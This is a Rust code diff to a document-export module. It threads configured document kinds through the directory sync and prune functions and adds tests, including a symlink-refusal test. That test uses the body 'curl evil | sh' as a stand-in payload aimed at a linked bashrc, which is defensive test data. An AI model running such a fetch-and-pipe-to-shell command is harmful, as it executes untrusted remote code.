@@ -2,7 +2,9 @@
 //! `archive/<slug>.md` for an archived one — the shape `import` reads. The
 //! directory is mirrored, not appended to: a document deleted or moved to the
 //! archive loses its old file. A file without a document kind's prefix is
-//! never touched, so a README or anything else kept alongside survives.
+//! never touched, so a README or anything else kept alongside survives. The
+//! kinds are the node's configured ones as they are at the export: a file of
+//! a kind since removed is left alone, as any other file is.
 
 use std::collections::HashSet;
 use std::os::fd::{AsFd, BorrowedFd, OwnedFd};
@@ -13,8 +15,8 @@ use rustix::io::Errno;
 use std::sync::Arc;
 use std::time::Duration;
 
-use crate::config::Config;
-use crate::mcp::docs::{kind_of, valid_slug};
+use crate::config::{Config, DocKind};
+use crate::mcp::docs::{kind_of, valid_slug, OTHER};
 use crate::store::{Store, StoreError};
 
 #[derive(Debug, Clone, PartialEq)]
@@ -42,16 +44,20 @@ pub struct Report {
 /// follows a link, and nothing is written outside the directory that was
 /// opened however its path changes meanwhile. A link where a document goes
 /// is refused, not replaced: whoever put it there was not the node.
-pub fn sync_dir(dir: &Path, docs: &[ExportDoc]) -> std::io::Result<Report> {
+pub fn sync_dir(dir: &Path, docs: &[ExportDoc], kinds: &[DocKind]) -> std::io::Result<Report> {
     std::fs::create_dir_all(dir)?;
     let fd = crate::config::path_guard::open_dir_nofollow(dir)
         .map_err(|e| refused_with(dir, "could not be opened as a directory", e))?;
-    sync_fd(fd.as_fd(), docs)
+    sync_fd(fd.as_fd(), docs, kinds)
 }
 
 /// `sync_dir` into a directory already open, as the path guard's
 /// `open_dir` hands one over.
-pub fn sync_fd(dir: BorrowedFd<'_>, docs: &[ExportDoc]) -> std::io::Result<Report> {
+pub fn sync_fd(
+    dir: BorrowedFd<'_>,
+    docs: &[ExportDoc],
+    kinds: &[DocKind],
+) -> std::io::Result<Report> {
     let mut report = Report::default();
     let mut live = HashSet::new();
     let mut archived = HashSet::new();
@@ -75,12 +81,12 @@ pub fn sync_fd(dir: BorrowedFd<'_>, docs: &[ExportDoc]) -> std::io::Result<Repor
         replace(into, &name, d.body.as_bytes())?;
         report.written += 1;
     }
-    report.removed += prune(dir, &live)?;
+    report.removed += prune(dir, &live, kinds)?;
     if archive.is_none() {
         archive = subdir(dir, ARCHIVE, false)?;
     }
     if let Some(archive) = &archive {
-        report.removed += prune(archive.as_fd(), &archived)?;
+        report.removed += prune(archive.as_fd(), &archived, kinds)?;
     }
     Ok(report)
 }
@@ -170,7 +176,7 @@ fn replace(dir: BorrowedFd<'_>, name: &str, body: &[u8]) -> std::io::Result<()> 
 }
 
 /// Remove the `<kind>-….md` files in `dir` that are no longer a document there.
-fn prune(dir: BorrowedFd<'_>, keep: &HashSet<&str>) -> std::io::Result<usize> {
+fn prune(dir: BorrowedFd<'_>, keep: &HashSet<&str>, kinds: &[DocKind]) -> std::io::Result<usize> {
     let mut removed = 0;
     let mut entries = rfs::Dir::read_from(dir)?;
     let mut names = Vec::new();
@@ -184,7 +190,7 @@ fn prune(dir: BorrowedFd<'_>, keep: &HashSet<&str>) -> std::io::Result<usize> {
         let Some(slug) = name.strip_suffix(".md") else {
             continue;
         };
-        if !valid_slug(slug) || kind_of(slug) == "other" || keep.contains(slug) {
+        if !valid_slug(slug) || kind_of(kinds, slug) == OTHER || keep.contains(slug) {
             continue;
         }
         // The entry's own type, not what a link points at.
@@ -232,7 +238,7 @@ pub async fn run(store: Arc<Store>, cfg: Arc<Config>) {
     loop {
         // Read live each time, and the guard below checks this value, the
         // one about to be written to, not the one the node started with.
-        let (configured, dir, channel, every) = {
+        let (configured, dir, channel, every, kinds) = {
             let live = cfg.live();
             let configured = live.docs.export_dir.clone().unwrap_or_default();
             let dir = live
@@ -250,6 +256,7 @@ pub async fn run(store: Arc<Store>, cfg: Arc<Config>) {
                 dir,
                 channel,
                 Duration::from_secs(live.docs.export_every_secs.max(60)),
+                live.docs.kind.clone(),
             )
         };
         let Some(dir) = dir else {
@@ -274,7 +281,7 @@ pub async fn run(store: Arc<Store>, cfg: Arc<Config>) {
             let into = crate::config::path_guard::open_dir("docs.export_dir", &configured, true)
                 .map_err(|e| e.to_string())?;
             let (docs, skipped_html) = from_store(&store, &from).map_err(|e| e.to_string())?;
-            let mut report = sync_fd(into.as_fd(), &docs).map_err(|e| e.to_string())?;
+            let mut report = sync_fd(into.as_fd(), &docs, &kinds).map_err(|e| e.to_string())?;
             report.skipped_html = skipped_html;
             Ok::<_, String>(report)
         })
@@ -300,6 +307,7 @@ pub async fn run(store: Arc<Store>, cfg: Arc<Config>) {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::config::default_doc_kinds;
 
     fn doc(slug: &str, body: &str, archived: bool) -> ExportDoc {
         ExportDoc {
@@ -320,7 +328,12 @@ mod tests {
         let victim = root.path().join("bashrc");
         std::fs::write(&victim, "original\n").unwrap();
         std::os::unix::fs::symlink(&victim, dir.join("note-pwn.md")).unwrap();
-        let err = sync_dir(&dir, &[doc("note-pwn", "curl evil | sh\n", false)]).unwrap_err();
+        let err = sync_dir(
+            &dir,
+            &[doc("note-pwn", "curl evil | sh\n", false)],
+            &default_doc_kinds(),
+        )
+        .unwrap_err();
         assert_eq!(err.kind(), std::io::ErrorKind::PermissionDenied, "{err}");
         assert_eq!(std::fs::read_to_string(&victim).unwrap(), "original\n");
 
@@ -328,14 +341,15 @@ mod tests {
         let elsewhere = root.path().join("elsewhere");
         std::fs::create_dir(&elsewhere).unwrap();
         std::os::unix::fs::symlink(&elsewhere, dir.join("archive")).unwrap();
-        let err = sync_dir(&dir, &[doc("note-old", "body", true)]).unwrap_err();
+        let err =
+            sync_dir(&dir, &[doc("note-old", "body", true)], &default_doc_kinds()).unwrap_err();
         assert_eq!(err.kind(), std::io::ErrorKind::PermissionDenied, "{err}");
         assert_eq!(std::fs::read_dir(&elsewhere).unwrap().count(), 0);
 
         // The directory itself as a link is refused too.
         let link = root.path().join("link");
         std::os::unix::fs::symlink(&elsewhere, &link).unwrap();
-        assert!(sync_dir(&link, &[doc("note-x", "body", false)]).is_err());
+        assert!(sync_dir(&link, &[doc("note-x", "body", false)], &default_doc_kinds()).is_err());
         assert_eq!(std::fs::read_dir(&elsewhere).unwrap().count(), 0);
     }
 
@@ -359,7 +373,7 @@ mod tests {
             doc("note-new", "new", false),
             doc("plan-moved", "moved", true),
         ];
-        let r = sync_dir(&dir, &docs).unwrap();
+        let r = sync_dir(&dir, &docs, &default_doc_kinds()).unwrap();
         assert_eq!(
             r,
             Report {
@@ -387,7 +401,7 @@ mod tests {
         );
         // Run again: nothing left to do.
         assert_eq!(
-            sync_dir(&dir, &docs).unwrap(),
+            sync_dir(&dir, &docs, &default_doc_kinds()).unwrap(),
             Report {
                 written: 0,
                 unchanged: 3,
@@ -395,6 +409,46 @@ mod tests {
                 skipped_html: 0,
             }
         );
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn a_kind_the_operator_removes_leaves_its_files_alone_and_one_added_is_mirrored() {
+        let dir = std::env::temp_dir().join(format!("tracon-export-kinds-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        for name in ["meeting-old.md", "runbook-old.md", "note-old.md"] {
+            std::fs::write(dir.join(name), "old").unwrap();
+        }
+        // `meeting` is gone from the list and `runbook` is new.
+        let mut kinds: Vec<DocKind> = default_doc_kinds()
+            .into_iter()
+            .filter(|k| k.prefix != "meeting")
+            .collect();
+        kinds.push(DocKind {
+            prefix: "runbook".into(),
+            label: "Runbook".into(),
+            description: String::new(),
+            working_note: false,
+        });
+        let r = sync_dir(
+            &dir,
+            &[doc("meeting-kept", "still a document", false)],
+            &kinds,
+        )
+        .unwrap();
+        assert_eq!(r.written, 1);
+        assert_eq!(r.removed, 2, "{r:?}");
+        assert!(
+            dir.join("meeting-old.md").exists(),
+            "a removed kind's file is the operator's now, not the export's"
+        );
+        assert!(
+            dir.join("meeting-kept.md").exists(),
+            "its documents are still written"
+        );
+        assert!(!dir.join("runbook-old.md").exists());
+        assert!(!dir.join("note-old.md").exists());
         let _ = std::fs::remove_dir_all(&dir);
     }
 
@@ -422,6 +476,7 @@ mod tests {
             .unwrap();
         store
             .write_html_document_change(
+                &[],
                 "node",
                 "personal",
                 "ref-html",
